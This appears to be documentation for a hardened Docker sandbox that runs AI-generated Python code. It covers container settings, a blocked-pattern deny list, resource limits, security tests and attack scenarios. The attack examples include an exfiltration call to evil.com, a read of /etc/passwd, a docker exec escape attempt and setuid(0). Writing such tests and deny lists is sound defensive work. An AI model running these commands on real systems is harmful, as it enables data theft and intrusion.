# Secure Executor

## Overview

The Secure Executor is a hardened Docker container that runs untrusted, AI-generated code in complete isolation. It provides **9/10 security** through multiple layers of defense.

## Security Rating: 9/10 ⭐⭐⭐⭐⭐

### Why 9/10?

✅ **Strengths**:
- Container isolation
- No network access
- Read-only filesystem
- No Linux capabilities
- Non-root user
- Resource limits
- Code validation

⚠️ **Limitations** (why not 10/10):
- Container runtime vulnerabilities possible
- Python interpreter exploits possible
- Kernel vulnerabilities could affect isolation

## Architecture

```
┌────────────────────────────────────────────────────┐
│ Executor Container                                  │
│                                                     │
│  ┌──────────────────────────────────────────────┐ │
│  │ Security Layer 1: Container Isolation        │ │
│  │ - No network (except main app)              │ │
│  │ - Read-only filesystem                      │ │
│  │ - User: nobody (65534)                      │ │
│  │ - No capabilities                           │ │
│  └──────────────────────────────────────────────┘ │
│                                                     │
│  ┌──────────────────────────────────────────────┐ │
│  │ Security Layer 2: Code Validation            │ │
│  │ - Block dangerous imports                   │ │
│  │ - Block system calls                        │ │
│  │ - Code length limits                        │ │
│  └──────────────────────────────────────────────┘ │
│                                                     │
│  ┌──────────────────────────────────────────────┐ │
│  │ Security Layer 3: Resource Limits            │ │
│  │ - Memory: 512MB                             │ │
│  │ - CPU: 30s timeout                          │ │
│  │ - Processes: No fork                        │ │
│  └──────────────────────────────────────────────┘ │
│                                                     │
│  ┌──────────────────────────────────────────────┐ │
│  │ Code Execution                               │ │
│  │ exec(user_code, safe_globals, safe_locals)  │ │
│  └──────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────┘
```

## Security Layers

### Layer 1: Container Isolation

#### Network Isolation

```yaml
# docker-compose.yml
executor:
  networks:
    - internal  # No external network access
```

**Prevents**:
- Data exfiltration to external servers
- Downloading malicious code
- Scanning internal network
- DDoS attacks

#### Read-Only Filesystem

```yaml
executor:
  read_only: true
  tmpfs:
    - /tmp:rw,noexec,nosuid,size=64m
```

**Prevents**:
- Writing malware to disk
- Persisting malicious code
- Modifying system files
- Creating backdoors

#### Non-Root User

```yaml
executor:
  user: "65534:65534"  # nobody
  security_opt:
    - no-new-privileges
```

**Prevents**:
- Privilege escalation
- Root exploits
- System file access

#### Dropped Capabilities

```yaml
executor:
  cap_drop:
    - ALL
```

**Prevents**:
- Network operations (CAP_NET_RAW)
- Mounting filesystems (CAP_SYS_ADMIN)
- Loading kernel modules (CAP_SYS_MODULE)
- Changing system time (CAP_SYS_TIME)

### Layer 2: Code Validation

#### Blocked Patterns

```python
BLOCKED_PATTERNS = [
    '__import__',
    'eval(',
    'exec(',
    'compile(',
    'open(',
    'file(',
    'subprocess',
    'os.system',
    'socket.',
    'urllib.',
    'requests.',  # Except for RPC
]
```

**Example Blocked Code**:

```python
# ❌ BLOCKED: Direct import
import subprocess
subprocess.run(['ls', '-la'])

# ❌ BLOCKED: Dynamic import
__import__('os').system('ls')

# ❌ BLOCKED: File operations
open('/etc/passwd', 'r').read()

# ❌ BLOCKED: Network operations
import socket
socket.socket()

# ✅ ALLOWED: Using registered tools
tools['database'].run(query='SELECT * FROM users')
```

#### Safe Builtins

Only safe built-in functions are available:

```python
SAFE_BUILTINS = {
    'abs', 'all', 'any', 'bool', 'dict', 'enumerate',
    'filter', 'float', 'int', 'isinstance', 'len', 'list',
    'map', 'max', 'min', 'range', 'reversed', 'round',
    'set', 'sorted', 'str', 'sum', 'tuple', 'zip',
    'True', 'False', 'None', 'print'
}
```

### Layer 3: Resource Limits

#### Memory Limit

```python
import resource
resource.setrlimit(
    resource.RLIMIT_AS,
    (256*1024*1024, 256*1024*1024)  # 256MB
)
```

**Prevents**:
- Memory exhaustion attacks
- OOM (Out of Memory) crashes
- Denial of service

#### CPU Timeout

```python
resource.setrlimit(resource.RLIMIT_CPU, (30, 30))  # 30 seconds
```

**Prevents**:
- Infinite loops
- CPU hogging
- Denial of service

#### Process Limit

```python
resource.setrlimit(resource.RLIMIT_NPROC, (1, 1))  # No fork
```

**Prevents**:
- Fork bombs
- Process spawning
- Resource exhaustion

## Code Execution Flow

```
1. Receive execution request
   ├─ Code: "weather = tools['weather'].run(location='NYC')"
   ├─ Available tools: ['weather', 'database']
   └─ Config: {...}

2. Validate code
   ├─ Check for blocked patterns
   ├─ Check code length (<10KB)
   └─ Pass ✓

3. Wrap code with tool proxies
   ├─ Inject ToolProxy class
   ├─ Create tools dict with proxies
   └─ Append user code

4. Create safe execution environment
   ├─ safe_globals = {'__builtins__': {...}, 'tools': {...}}
   ├─ safe_locals = {}
   └─ Set resource limits

5. Execute code
   ├─ exec(wrapped_code, safe_globals, safe_locals)
   ├─ Tool calls → RPC to main app
   └─ Return result variable

6. Return result
   └─ {'success': True, 'result': '...', 'stdout': '...'}
```

## Configuration

### codemode.yaml

```yaml
executor:
  url: http://executor:8001
  api_key: ${CODEMODE_API_KEY}
  timeout: 35

  limits:
    code_timeout: 30          # Max execution time
    max_code_length: 10000    # Max code size
    memory_limit: 512Mi       # Container memory
    cpu_limit: 500m           # Container CPU

  security:
    blocked_imports:
      - subprocess
      - os.system
      - socket
      - urllib
      - requests

    safe_builtins:
      - print
      - len
      - str
      - int
      - float
      - dict
      - list
```

## Deployment

### Docker Compose

```yaml
version: '3.8'

services:
  executor:
    image: codemode-executor:0.2.0
    environment:
      - CODEMODE_API_KEY=${CODEMODE_API_KEY}
      - MAIN_APP_GRPC_TARGET=app:50051

    # SECURITY SETTINGS
    read_only: true
    security_opt:
      - no-new-privileges
    cap_drop:
      - ALL
    user: "65534:65534"
    mem_limit: 512m
    pids_limit: 128
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m

    networks:
      - internal  # No external access
```

### Kubernetes

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: executor
    image: codemode-executor:0.2.0
    securityContext:
      runAsUser: 65534
      runAsNonRoot: true
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL

    resources:
      requests:
        memory: "256Mi"
        cpu: "250m"
      limits:
        memory: "512Mi"
        cpu: "500m"

    volumeMounts:
    - name: tmp
      mountPath: /tmp

  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 64Mi
```

## Testing Security

### Test 1: Network Access

```python
# Should fail
code = """
import socket
s = socket.socket()
s.connect(('google.com', 80))
"""

result = executor.execute(code)
assert not result.success
assert 'blocked' in result.error.lower()
```

### Test 2: File System Access

```python
# Should fail
code = """
open('/etc/passwd', 'r').read()
"""

result = executor.execute(code)
assert not result.success
```

### Test 3: Process Spawning

```python
# Should fail
code = """
import subprocess
subprocess.run(['ls', '-la'])
"""

result = executor.execute(code)
assert not result.success
```

### Test 4: Resource Exhaustion

```python
# Should timeout
code = """
while True:
    pass
"""

result = executor.execute(code)
assert not result.success
assert 'timeout' in result.error.lower()
```

## Attack Scenarios & Mitigations

### Scenario 1: Data Exfiltration

**Attack**:
```python
import requests
requests.post('https://evil.com', data=secret_data)
```

**Mitigation**:
- No network access ✓
- `requests` import blocked ✓

### Scenario 2: Cryptocurrency Mining

**Attack**:
```python
while True:
    # CPU-intensive mining
    hash_function(data)
```

**Mitigation**:
- CPU timeout (30s) ✓
- Container CPU limit ✓

### Scenario 3: Filesystem Persistence

**Attack**:
```python
with open('/app/malware.py', 'w') as f:
    f.write('malicious code')
```

**Mitigation**:
- Read-only filesystem ✓
- `open` function blocked ✓

### Scenario 4: Container Escape

**Attack**:
```python
import os
os.system('docker exec -it main_app bash')
```

**Mitigation**:
- No capabilities ✓
- Non-root user ✓
- `os.system` blocked ✓

### Scenario 5: Privilege Escalation

**Attack**:
```python
import os
os.setuid(0)  # Become root
```

**Mitigation**:
- `no-new-privileges` ✓
- Non-root user ✓
- No CAP_SETUID ✓

## Monitoring

### Security Events to Log

```python
logger.warning("Security violation", extra={
    'type': 'blocked_pattern',
    'pattern': '__import__',
    'code': code[:100],
    'timestamp': datetime.now()
})
```

### Metrics to Track

1. **Blocked executions** - Count of security violations
2. **Timeout events** - Count of timeouts
3. **Resource usage** - Memory/CPU usage
4. **Execution time** - Duration of executions

## Best Practices

### 1. Regular Security Updates

```bash
# Update base image regularly
docker pull python:3.11-slim
docker build -t codemode-executor:0.2.0 .
```

### 2. Security Scanning

```bash
# Scan for vulnerabilities
trivy image codemode-executor:0.2.0
```

### 3. Audit Logging

```python
# Log all executions
logger.info("Code execution", extra={
    'code': code,
    'user': user_id,
    'result': result.success,
    'duration': duration
})
```

### 4. Rate Limiting

```python
# Limit executions per user
@limiter.limit("100/hour")
async def execute_code(request):
    ...
```

## Comparison to Other Sandboxes

| Feature | Codemode | gVisor | Firecracker | Docker |
|---------|----------|--------|-------------|--------|
| Isolation | Container | Kernel | VM | Container |
| Startup | <1s | ~1s | ~1s | <1s |
| Overhead | Low | Medium | Medium | Low |
| Security | 9/10 | 9/10 | 10/10 | 7/10 |
| Complexity | Low | High | High | Low |

## Troubleshooting

### Issue: "Permission denied"

**Cause**: User permissions issue

**Solution**:
```yaml
executor:
  user: "65534:65534"  # Ensure this is set
```

### Issue: "Cannot write to /tmp"

**Cause**: Read-only filesystem

**Solution**:
```yaml
executor:
  tmpfs:
    - /tmp:rw,noexec,nosuid,size=64m  # Mount tmpfs
```

### Issue: "Memory limit exceeded"

**Cause**: Code using too much memory

**Solution**:
```yaml
executor:
  mem_limit: 1Gi  # Increase if needed
```

## Related Features

- [RPC Bridge](./rpc-bridge.md) - How tools are accessed
- [Configuration](./configuration.md) - Security settings
- [Monitoring](./monitoring.md) - Security metrics
